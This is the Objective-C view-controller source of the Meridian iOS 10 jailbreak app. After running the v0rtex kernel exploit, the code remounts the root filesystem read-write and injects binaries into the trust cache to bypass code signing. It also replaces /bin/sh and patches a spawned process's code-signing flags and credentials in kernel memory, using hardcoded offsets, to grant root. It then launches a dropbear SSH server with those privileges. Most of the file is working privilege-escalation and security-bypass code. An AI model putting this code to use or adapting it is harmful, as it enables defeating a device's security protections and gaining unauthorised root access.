//
//  ViewController.m
//  Meridian
//
//  Created by Ben Sparkes on 22/12/2017.
//  Copyright © 2017 Ben Sparkes. All rights reserved.
//

#import "ViewController.h"
#import "v0rtex.h"
#import "patchfinder64.h"
#import "kernel.h"
#import "amfi.h"
#import "root-rw.h"
#import "symbols.h"
#import <sys/utsname.h>
#import <sys/stat.h>
#import <sys/spawn.h>
#import <Foundation/Foundation.h>

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UIButton *goButton;
@property (weak, nonatomic) IBOutlet UIButton *creditsButton;
@property (weak, nonatomic) IBOutlet UIButton *websiteButton;
@property (weak, nonatomic) IBOutlet UIButton *sourceButton;
@property (weak, nonatomic) IBOutlet UIActivityIndicatorView *progressSpinner;
@property (weak, nonatomic) IBOutlet UITextView *textArea;
@end

task_t tfp0;
kptr_t kslide;
kptr_t kernel_base;
kptr_t kernucred;
kptr_t selfproc;

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    _goButton.layer.cornerRadius = 5;
    _creditsButton.layer.cornerRadius = 5;
    _websiteButton.layer.cornerRadius = 5;
    _sourceButton.layer.cornerRadius = 5;

    // Log current device and version info
    NSOperatingSystemVersion ver = [[NSProcessInfo processInfo] operatingSystemVersion];
    NSString *verString = [[NSProcessInfo processInfo] operatingSystemVersionString];
    struct utsname u;
    uname(&u);
    
    [self writeTextPlain:[NSString stringWithFormat:@"> found %s on iOS %@", u.machine, verString]];
    
    if (ver.majorVersion != 10) {
        [self writeTextPlain:@"> Meridian does not work on versions of iOS other than iOS 10."];
        [self.goButton setHidden:YES];
        return;
    }
    
    if (!init_symbols()) {
        [self writeTextPlain:@"> Your device is not supported; no offsets were found."];
        [self.goButton setHidden:YES];
        return;
    }
    
    if (ver.minorVersion < 3) {
        [self writeTextPlain:@"WARNING: Meridian is UNTESTED on versions lower than iOS 10.3. It should work (in theory), but may bootloop your device. Proceeed at your own risk."];
    }
    
    [self writeTextPlain:@"> ready."];
}

- (IBAction)goButtonPressed:(UIButton *)sender {
    
    // lets run dat ting
    
    [self writeTextPlain:@"running..."];
    [self.goButton setEnabled:NO];
    [self.goButton setHidden:YES];
    [self.creditsButton setEnabled:NO];
    self.creditsButton.alpha = 0.5;
    [self.websiteButton setEnabled:NO];
    self.websiteButton.alpha = 0.5;
    // [self.sourceButton setEnabled:NO];
    // self.sourceButton.alpha = 0.5;
    [self.progressSpinner startAnimating];
    
    /* if you just lookin to test the 'in progress' UI uncomment this and comment the rest
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^(void) {
        [self exploitFailed];
    });
     */
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^(void) {
        
        int ret = v0rtex(&tfp0, &kslide, &kernucred, &selfproc);
        
        dispatch_async(dispatch_get_main_queue(), ^{
            if (ret == 0) {
                [self writeTextPlain:@"exploit succeeded!"];
                [self makeShitHappen];
            } else {
                [self exploitFailed];
            }
        });
    });
}

-(void) makeShitHappen {
    kernel_base = kslide + 0xFFFFFFF007004000;
    
    printf("kslide: %llu \n", kslide);
    printf("kernel_base: %llu \n", kernel_base);
    printf("self_proc: %llu \n", selfproc);
    printf("kern_ucred: %llu \n", kernucred);
    
    {
        // set up stuff
        init_patchfinder(tfp0, kernel_base, NULL);
        init_amfi(tfp0);
        init_kernel(tfp0);
    }
    
    {
        // remount '/' as r/w
        [self writeText:@"remounting '/' as r/w..."];
        int remount = mount_root(tfp0, kslide);
        LOG("remount: %d", remount);
        if (remount != 0) {
            [self writeTextPlain:[NSString stringWithFormat:@"ERROR: failed to remount '/' as r/w! (%d)", remount]];
            [self exploitFailed];
            return;
        }
        [self writeText:@"done!"];
    }
    
    {
        // create dirs for v0rtex
        [self writeText:@"creating /meridian directory..."];
        mkdir("/meridian", 0777);
        mkdir("/meridian/bins", 0777);
        mkdir("/meridian/logs", 0777);
        [self writeText:@"done!"];
    }
    
    // init filemanager n bundlepath
    NSFileManager *fileMgr = [NSFileManager defaultManager];
    NSString *bundlePath = [NSString stringWithFormat:@"%s", bundle_path()];
    
    {
        // remove old files (this is lazy code, ik)
        [self writeText:@"removing old files..."];
        [fileMgr removeItemAtPath:@"/meridian/bins" error:nil];
        [fileMgr removeItemAtPath:@"/meridian/cydia.tar" error:nil];
        [fileMgr removeItemAtPath:@"/meridian/bootstrap.tar" error:nil];
        [fileMgr removeItemAtPath:@"/meridian/dropbear" error:nil];
        [fileMgr removeItemAtPath:@"/meridian/tar" error:nil];
        [fileMgr removeItemAtPath:@"/bin/sh" error:nil];
        [self writeText:@"done!"];
        
        // copy in our bins and shit
        [self writeText:@"copying bins..."];
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/bootstrap.tar"]
                         toPath:@"/meridian/bootstrap.tar"
                          error:nil];
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/dropbear"]
                         toPath:@"/meridian/dropbear"
                          error:nil];
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/tar"]
                         toPath:@"/meridian/tar"
                          error:nil];
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/bash"]
                         toPath:@"/bin/sh"
                          error:nil];
        [self writeText:@"done!"];
        
        // copy cydia
//        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/cydia.tar"]
//                         toPath:@"/v0rtex/cydia.tar"
//                          error:nil];
        
        [self writeText:@"setting up the envrionment..."];
        
        // give our bins perms
        chmod("/meridian/dropbear", 0777);
        chmod("/meridian/tar", 0777);
        chmod("/bin/sh", 0777);
        
        // create dir's and files for dropbear
        mkdir("/etc", 0777);
        mkdir("/etc/dropbear", 0777);
        mkdir("/var", 0777);
        mkdir("/var/log", 0777);
        fclose(fopen("/var/log/lastlog", "ab+"));
        
        [self writeText:@"done!"];
    }
    
    {
        [self writeText:@"injecting bins to trust cache..."];
        inject_trust("/bin/sh");
        inject_trust("/meridian/dropbear");
        inject_trust("/meridian/tar");
        [self writeText:@"done!"];
    }
    
    {
        // extract the bootstrap
        [self writeText:@"extracting the bootstrap and signing..."];
        execprog(0, "/meridian/tar", (const char**)&(const char*[]) {
            "/meridian/tar",
            "-xf",
            "/meridian/bootstrap.tar",
            "-C",
            "/meridian",
            NULL
        });
        
        // trust all the bins
        trust_files("/meridian/bins");
        
        [self writeText:@"done!"];
    }
    
    {
        // TODO: cydia stuff
        
        close(creat("/.cydia_no_stash", 0644));
    }
    
    {
        // create .profile files
        
        [self writeText:@"creating .profile files..."];
        
        if (![fileMgr fileExistsAtPath:@"/var/mobile/.profile"]) {
            [fileMgr createFileAtPath:@"/var/mobile/profile"
                             contents:[[NSString stringWithFormat:@"export PATH=$PATH:/meridian/bins"]
                                       dataUsingEncoding:NSASCIIStringEncoding]
                           attributes:nil];
        }
        
        if (![fileMgr fileExistsAtPath:@"/var/root/.profile"]) {
            [fileMgr createFileAtPath:@"/var/root/.profile"
                             contents:[[NSString stringWithFormat:@"export PATH=$PATH:/meridian/bins"]
                                       dataUsingEncoding:NSASCIIStringEncoding]
                           attributes:nil];
        }
        
        [self writeText:@"done!"];
    }
    
    {
        // Launch dropbear
        [self writeText:@"launching dropebear..."];
        execprog(kernucred, "/meridian/dropbear", (const char**)&(const char*[]) {
            "/meridian/dropbear",
            "-R",
            "-E",
            "-m",
            "-S",
            "/",
            NULL
        });
        [self writeText:@"done!"];
    }
    
    [self exploitSucceeded];
}

- (IBAction)websiteButtonPressed:(UIButton *)sender {
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"https://meridian.sparkes.zone"]
                                       options:@{}
                             completionHandler:nil];
}

- (IBAction)sourceButtonPressed:(UIButton *)sender {
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"https://github.com/PsychoTea/MeridianJB"]
                                       options:@{}
                             completionHandler:nil];
}

- (void)exploitSucceeded {
    [self writeTextPlain:@"\n> your device has been freed!"];
    
    [self.progressSpinner stopAnimating];
    
    [self.goButton setEnabled:NO];
    [self.goButton setHidden:NO];
    self.goButton.alpha = 0.5;
    [self.goButton setTitle:@"done" forState:UIControlStateNormal];
    
    [self.creditsButton setEnabled:YES];
    self.creditsButton.alpha = 1;
    [self.websiteButton setEnabled:YES];
    self.websiteButton.alpha = 1;
    // [self.sourceButton setEnabled:YES];
    // self.sourceButton.alpha = 1;
}

- (void)exploitFailed {
    [self writeTextPlain:@"exploit failed. please try again. \n"];
    
    [self.goButton setEnabled:YES];
    [self.goButton setHidden:NO];
    [self.creditsButton setEnabled:YES];
    self.creditsButton.alpha = 1;
    [self.websiteButton setEnabled:YES];
    self.websiteButton.alpha = 1;
    // [self.sourceButton setEnabled:YES];
    // self.sourceButton.alpha = 1;
    [self.progressSpinner stopAnimating];
}

- (void)writeText:(NSString *)message {
    if (![message  isEqual: @"done!"]) {
        NSLog(@"%@", message);
        _textArea.text = [_textArea.text stringByAppendingString:[NSString stringWithFormat:@"%@ ", message]];
    } else {
        _textArea.text = [_textArea.text stringByAppendingString:[NSString stringWithFormat:@"%@\n", message]];
    }
    
    NSRange bottom = NSMakeRange(_textArea.text.length - 1, 1);
    [self.textArea scrollRangeToVisible:bottom];
}

- (void)writeTextPlain:(NSString *)message {
    _textArea.text = [_textArea.text stringByAppendingString:[NSString stringWithFormat:@"%@\n", message]];
    NSRange bottom = NSMakeRange(_textArea.text.length - 1, 1);
    [self.textArea scrollRangeToVisible:bottom];
}

// creds to stek29 on this one
int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
    if (args == NULL) {
        args = (const char **)&(const char*[]){ prog, NULL };
    }
    
    const char *logfile = [NSString stringWithFormat:@"/meridian/logs/%@-%lu",
                           [[NSMutableString stringWithUTF8String:prog] stringByReplacingOccurrencesOfString:@"/" withString:@"_"],
                           time(NULL)].UTF8String;
    printf("Spawning [ ");
    for (const char **arg = args; *arg != NULL; ++arg) {
        printf("'%s' ", *arg);
    }
    printf("] to logfile [ %s ] \n", logfile);
    
    int rv;
    posix_spawn_file_actions_t child_fd_actions;
    if ((rv = posix_spawn_file_actions_init (&child_fd_actions))) {
        perror ("posix_spawn_file_actions_init");
        return rv;
    }
    if ((rv = posix_spawn_file_actions_addopen (&child_fd_actions, STDOUT_FILENO, logfile,
                                                O_WRONLY | O_CREAT | O_TRUNC, 0666))) {
        perror ("posix_spawn_file_actions_addopen");
        return rv;
    }
    if ((rv = posix_spawn_file_actions_adddup2 (&child_fd_actions, STDOUT_FILENO, STDERR_FILENO))) {
        perror ("posix_spawn_file_actions_adddup2");
        return rv;
    }
    
    pid_t pd;
    if ((rv = posix_spawn(&pd, prog, &child_fd_actions, NULL, (char**)args, NULL))) {
        printf("posix_spawn error: %d (%s)\n", rv, strerror(rv));
        return rv;
    }
    
    printf("process spawned with pid %d \n", pd);
    
    #define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
    #define CS_INSTALLER            0x0000008    /* has installer entitlement      */
    #define CS_HARD                 0x0000100    /* don't load invalid pages       */
    #define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
    #define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
    
    /*
     1. read 8 bytes from proc+0x100 into self_ucred
     2. read 8 bytes from kern_ucred + 0x78 and write them to self_ucred + 0x78
     3. write 12 zeros to self_ucred + 0x18
     */
    
    if (kern_ucred != 0) {
        int tries = 3;
        while (tries-- > 0) {
            sleep(1);
            // allproc is added to kslide
            // may need 2 be moved 2 an offset ¯\_(ツ)_/¯
            uint64_t proc = rk64(kslide + 0xFFFFFFF0075E66F0);
            while (proc) {
                uint32_t pid = rk32(proc + 0x10);
                if (pid == pd) {
                    uint32_t csflags = rk32(proc + 0x2a8);
                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
                    wk32(proc + 0x2a8, csflags);
                    tries = 0;
                    
                    // i don't think this bit is implemented properly
                    uint64_t self_ucred = rk64(proc + 0x100);
                    uint32_t selfcred_temp = rk32(kern_ucred + 0x78);
                    wk32(self_ucred + 0x78, selfcred_temp);
                    
                    for (int i = 0; i < 12; i++) {
                        wk32(self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
                    }
                    
                    printf("gave elevated perms to pid %d \n", pid);
                    
                    // original stuff, rewritten above using v0rtex stuff
                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
                    break;
                }
                proc = rk64(proc);
            }
        }
    }
    
    int status;
    waitpid(pd, &status, 0);
    printf("'%s' exited with %d (sig %d)\n", prog, WEXITSTATUS(status), WTERMSIG(status));
    
    char buf[65] = {0};
    int fd = open(logfile, O_RDONLY);
    if (fd == -1) {
        perror("open logfile");
        return 1;
    }
    
    printf("contents of %s: \n ------------------------- \n", logfile);
    while(read(fd, buf, sizeof(buf) - 1) == sizeof(buf) - 1) {
        printf("%s", buf);
    }
    printf("%s", buf);
    printf("\n-------------------------\n");
    
    close(fd);
    remove(logfile);
    
    return 0;
}

void get_files(const char *path) {
    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[NSString stringWithFormat:@"%s", path]
                                                                        error:NULL];
    [dirs enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {
        NSLog(@"%@", (NSString *)obj);
    }];
}

void read_file(const char *path) {
    char buf[65] = {0};
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        perror("open path");
        return;
    }
    
    printf("contents of %s: \n ------------------------- \n", path);
    while(read(fd, buf, sizeof(buf) - 1) == sizeof(buf) - 1) {
        printf("%s", buf);
    }
    printf("%s", buf);
    printf("\n-------------------------\n");
    
    close(fd);
}

char* bundle_path() {
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char* path = malloc(len);
    
    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
    
    return path;
}

@end
